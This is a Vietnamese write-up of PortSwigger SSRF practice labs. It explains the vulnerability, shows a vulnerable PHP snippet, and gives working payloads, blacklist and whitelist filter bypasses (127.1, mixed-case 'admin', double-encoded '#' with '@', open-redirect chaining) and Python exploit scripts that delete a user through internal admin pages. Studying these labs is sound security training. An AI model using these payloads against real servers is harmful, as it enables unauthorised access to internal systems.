# Server-side request forgery (SSRF)

## Khái niệm & Tác hại & phòng tránh

<ul>
    <ul>
        <b>Khái niệm</b>
        <li>một lỗ hổng web cho phép attacker thực hiện ở phía server các requests đến domain tùy ý của kẻ tấn công hay còn gọi là tấn công yêu cầu giả mạo từ phía máy chủ cho phép kẻ tấn công thay đổi tham số được sử dụng trên ứng dụng web để tạo hoặc kiểm soát các yêu cầu từ máy chủ dễ bị tấn công.</li>
        <li>Trong SSRF, các attacker có thể khiến máy chủ kết nối đến chính dịch vụ của nó hoặc các dịch vụ của bên thứ ba nào đó.</li>
        <li>https://example.com/feed.php?url=externalsite.com/feed/ để lấy nguồn cấp dữ liệu từ xa. Nếu kẻ tấn công có thể thay đổi tham số url thành localhost, thì anh ta có thể xem các tài nguyên cục bộ được lưu trữ trên máy chủ, làm cho nó dễ bị tấn công bởi yêu cầu giả mạo từ phía máy chủ.</li>
    </ul>
    <ul>
        <b>Tác hại</b>
        <ul>Nếu kẻ tấn công có thể kiểm soát đích của các yêu cầu phía máy chủ, chúng có thể thực hiện các hành động sau:
            <li>Lạm dụng mối quan hệ tin cậy giữa máy chủ dễ bị tổn thương và những người khác, bỏ qua danh sách trắng IP, đọc tài nguyên mà công chúng không thể truy cập</li>
            <li>Quét mạng nội bộ mà máy chủ được kết nối đến, truy xuất thông tin nhạy cảm như địa chỉ IP của máy chủ web sau proxy ngược</li>
            <li>Trong một số trường hợp SSRF có thể dẫn đến attacker có thể thực hiện command execution</li>
        </ul>
    </ul>
    <img src="https://images.viblo.asia/0b192762-6c39-4255-ad05-0e58ea99deb0.png">
    <ul>
        <b>Phòng tránh</b>
        <li>Để ngăn ngừa các lỗ hổng SSRF trong ứng dụng web bạn nên sử dụng các while list các domains và protocols được phép truy cập tài nguyên từ phía máy chủ.</li>
        <li>Nên tránh sử dụng các chức năng mà người dùng trực tiếp yêu cầu tài nguyên thay cho máy chủ. Ví dụ xét đoạn code sử dụng hàm file_get_contents() sau:
        </li>
    </ul>
    
    
</ul>

```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $content = file_get_contents($url);
    echo $content;
} else {
    echo "Give me the URL to show your content!";
}
```

<li>Đoạn code trên in ra nội dung trang web thông qua tham số url được truyền bởi người dùng bằng hàm file_get_contents(), Ví dụ với url=http://localhost:8080</li>

## 1. Lab: Basic SSRF against the local server

link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

### Đề bài

![image](https://hackmd.io/_uploads/Hk4AaIFta.png)

### Phân tích

<ul>
    <li>chúng ta cần leo thang đặc quyền lên admin và xóa người dùng carlos </li>
    <li>bài lab này có yêu cầu dữ liệu api từ bên trong hệ thống server nên chúng ta có thể tận dụng lỗi csrf để thực hiện mục đích</li>
</ul>

![image](https://hackmd.io/_uploads/rkP9gvYYp.png)

![image](https://hackmd.io/_uploads/S1FYgPtYT.png)

![image](https://hackmd.io/_uploads/SJNTlwtYa.png)

Khi thực hiện Check stock, một POST request gửi đến /product/stock với body là địa chỉ đường dẫn một API. Có thể hiểu rằng server query lên API lấy kết quả trước khi trả về cho người dùng.

```
http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

Hệ thống nhận stockApi là url (tin tưởng là local rồi) nên trả về số lượng hàng tồn kho như yêu cầu

### Khai thác

mình có thể SSRF - sử dụng chính stockApi này để query lên các local URL. Để solve challenge, ta sẽ vào `http://localhost/admin` và xóa người dùng carlos.

![image](https://hackmd.io/_uploads/SkRc6l9Fa.png)

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a8100f203d07f528234351500340006.web-security-academy.net'

session = requests.Session()

data = 'stockApi=http://localhost/admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SJLkzvKFT.png)

![image](https://hackmd.io/_uploads/HkHSzvFtT.png)

mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/S110WwYF6.png)

## 2. Lab: Basic SSRF against another back-end system

link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

### Đề bài

![image](https://hackmd.io/_uploads/B1nI0gqYT.png)

### Phân tích

<ul>
    <li>tương tự bài trước bài này cũng truy vấn đến hệ thống nội bộ bên phía server để lấy dữ liệu kiểm tra hàng tồn kho</li>
    <li>nhưng bài cho chúng ta biết phải scan địa chỉ ip nội bộ 192.168.0.X, có lẽ chúng ta sẽ yêu cầu dữ liệu từ máy trong mạng nội bộ bên phía server chứ không còn từ local như bài lab trước</li>
    <li>và có lẽ trang admin mà chúng ta muốn truy cập vào cũng ở 1 máy khác trong mạng và giờ chúng ta cần tìm được địa chỉ ip của máy đó</li>
</ul>

mình bắt được gói tin

![image](https://hackmd.io/_uploads/Sy7e--5K6.png)

### Khai thác

Ứng dụng lab này tiếp tục bị dính SSRF tại chức năng check stock. Tuy nhiên, lần này ta sẽ đi thực hiện request đến trang admin của ứng dụng web khác có địa chỉ http://192.168.0.X:8080/admin. Ta phải đi tìm X bằng cách bruteforce 255 giá trị từ 1-255 bằng Intruder.

![image](https://hackmd.io/_uploads/HJZLWWqta.png)

![image](https://hackmd.io/_uploads/Sk69WZ5ta.png)

<li>Status 200 và trả về admin, vậy ta tìm được IP là 192.168.0.140</li>

![image](https://hackmd.io/_uploads/BJ0RvWcFa.png)

![image](https://hackmd.io/_uploads/Bykr_W5t6.png)

và mình xóa người dùng carlos bằng

```
stockApi=http://192.168.0.140:8080/admin/delete?username=carlos
```

mình đã viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0aab00210414d0558362c96100660024.web-security-academy.net'

session = requests.Session()

data_url = 'stockApi=http://192.168.0.140:8080/admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    data=data_url,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HkZHD-qKa.png)

## 3. Lab: Blind SSRF with out-of-band detection

link: https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

### Đề bài

![image](https://hackmd.io/_uploads/B1AmK-5Y6.png)

### Phân tích

Ứng dụng lab này sử dụng 1 software khác luôn fetch đến URL tại trường header Referer mỗi khi user truy cập 1 trang sản phẩm bất kì

![image](https://hackmd.io/_uploads/rktt3WcFa.png)

Header Referer chứa URL của trang được truy cập trước khi chúng ta truy cập đến `/product?productId=1`

<li>Thay đổi giá trị header Referer thành địa chỉ tới domain Burp Collaborator.</li>

## 4. Lab: SSRF with blacklist-based input filter

link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

### Đề bài

![image](https://hackmd.io/_uploads/SJ20ZM5YT.png)

### Phân tích

<li>có vẻ bài này giống vs bài 1 khi server request dữ liệu để check hàng tồn kho tại máy local nhưng nó đã bị filter và chúng ta cần bypass nó</li>

<li>Bài này nâng cấp hơn bằng cách blacklist filter một số chuỗi như localhost, 127.0.0.1, … Thử với payload http://localhost thì bị trả 400 Bad Request. Tương tự với 127.0.0.1.</li>

![image](https://hackmd.io/_uploads/rynS7GcFa.png)

### Khai thác

<li>Ta sẽ bypass bằng http://127.1. Lúc này ta truy cập được trang chủ thành công.</li>

![image](https://hackmd.io/_uploads/rk19Xf9Ka.png)

Tuy nhiên, /admin cũng bị chặn → chuỗi admin bị filter.

![image](https://hackmd.io/_uploads/S139mzctp.png)

Ta bypass bằng cách obfuscate admin thành AdMiN hoặc AdmIn, …

![image](https://hackmd.io/_uploads/rkWyVG5Ka.png)

và mình xóa người dùng carlos bằng

```
stockApi=http://127.1/Admin/delete?username=carlos
```

mình đã viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0ad5007c03c3a4a88398913f00430085.web-security-academy.net'

session = requests.Session()

data_url = 'stockApi=http://127.1/Admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    data=data_url,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Hkd44fcY6.png)

mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SJusVM5Fp.png)

## 5. Lab: SSRF with filter bypass via open redirection vulnerability

link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

### Đề bài

![image](https://hackmd.io/_uploads/B1UIrz9Kp.png)

### Phân tích

<ul>
    <li>bài lab này chỉ cho phép chúng ta yêu cầu đến  local app mà tại đây không có trang admin theo mục đích của chúng ta và chúng ta cần truy cập đến http://192.168.0.12:8080/admin ở 1 máy khác</li>    
</ul>

![image](https://hackmd.io/_uploads/BySA8zqt6.png)

Thực hiện gán stockApi=http://192.168.0.12:8080/admin luôn thì bị trả về 400 Bad Request vì server đã validate URL này.

![image](https://hackmd.io/_uploads/BJnZufcYa.png)

Tuy nhiên, để ý tại mỗi post sản phẩm có chức năng chuyển trang Next product.

![image](https://hackmd.io/_uploads/r1KVOf9t6.png)

Click thử và bắt request, ta thấy nó là GET request `/product/nextProduct?currentProductId=1&path=/product?productId=2`

có chứa 1 tham số path là đường dẫn đến post sản phẩm tiếp theo

![image](https://hackmd.io/_uploads/rJk6_GqK6.png)

bài filter `&` và mình encode nó
![image](https://hackmd.io/_uploads/SkuKizcFT.png)

Như vậy ta sẽ thử SSRF tại stockApi với đường dẫn như `/product/nextProduct?currentProductId=1&path=/product?productId=2 `

Kết quả truy cập thành công. Server có thể không validate tham số path này, và ta sẽ tận dụng nó để SSRF đến ứng dụng cần tấn công.

![image](https://hackmd.io/_uploads/r1VznGqKp.png)

Truyền `path=http://192.168.0.12:8080/admin`, ta đã truy cập được trang admin của ứng dụng khác thành công.

và mình xóa người dùng carlos bằng

```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0aa40009048a191982db3e55002400af.web-security-academy.net'

session = requests.Session()

data_url = 'stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    data=data_url,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rJw9azctp.png)

mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/r14DafqK6.png)

bài này chỉ cho phép chúng ta truy cập dữ liệu tại máy server local nhưng có thêm chức năng chuyển hướng đến sản phẩm tiếp theo lại không filter đường dẫn nên đã cho phép chúng ta chuyển hướng đến máy khác trong mạng nội bộ và thực hiện mục đích

## 6. Lab: SSRF with whitelist-based input filter

link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

### Đề bài

![image](https://hackmd.io/_uploads/SkYwAIcYT.png)

### Phân tích

<li>tương tự bài trước bài này cũng truy vấn đến hệ thống nội bộ bên phía server để lấy dữ liệu kiểm tra hàng tồn kho nhưng đã có filter và chúng ta cần bypass nó</li>

![image](https://hackmd.io/_uploads/HJsYxD5KT.png)

`http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`

![image](https://hackmd.io/_uploads/BJA2ePcKp.png)

Lab này cũng bị lọc hostname, chỉ cho phép stock.weliketoshop.net

### Khai thác

<ul>
    <b>@ (Commercial at):</b>
    <ul> 
        <li>Trong phần domain của URL, ký tự "@" thường được sử dụng để chỉ địa chỉ email của người quản trị trang web hoặc người liên quan đến domain đó. Ví dụ: mailto:user@example.com sử dụng để tạo một liên kết email.</li>
        <li>Trong phần query string (phần sau dấu "?"), ký tự "@" có thể được sử dụng để xác định tên người dùng khi truy cập một trang web cụ thể.</li>
    </ul>
    <b># (Hash):</b>
    <ul>
        <li>Khi sử dụng trong phần fragment của URL (sau ký tự "#"), nó được sử dụng để chỉ đến một phần cụ thể của tài liệu HTML được gọi là "fragment identifier" hoặc "anchor". Nó không được gửi đến máy chủ khi truy cập trang web và thường được xử lý bởi trình duyệt để di chuyển đến một đoạn cụ thể của trang web.</li>
    <li>Ví dụ: Trong http://example.com/page#section1, trình duyệt sẽ cuộn đến phần có id là "section1" trên trang.</li>
    </ul>
</ul>

![image](https://hackmd.io/_uploads/ry_ibw5KT.png)

Mình sử dụng # để bypass không thành công.

Thử dùng chèn thêm tài khoản trước hostname bằng @ thì thấy server đã trả 500 response chứng tỏ server đã cố gắng connect đến URL đó không thành.

![image](https://hackmd.io/_uploads/r1VVMDcF6.png)

Lúc này thử kết hợp fragment # (encoded) vào sau localhost và @. Tuy nhiên kết quả lần này đã bị fail.

![image](https://hackmd.io/_uploads/By6qGD9tT.png)

Double encoded # thành %2523 thì thấy, ta đã truy cập thành công trang localhost → lỗi parse URL lúc validate URL.

![image](https://hackmd.io/_uploads/Byx3MvcYT.png)

Bây giờ chỉ cần /admin để truy cập trang admin.

![image](https://hackmd.io/_uploads/BJ90fPcF6.png)

và mình xóa người dùng carlos bằng

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a9d00030370c23b83e866f5002900e0.web-security-academy.net'

session = requests.Session()

headers = {
    'Host': '0a9d00030370c23b83e866f5002900e0.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data_url = 'stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos'

response = requests.post(
    url + '/product/stock',
    headers=headers,
    data=data_url,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/HJRZUw9K6.png)

mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/ByDgrPqta.png)
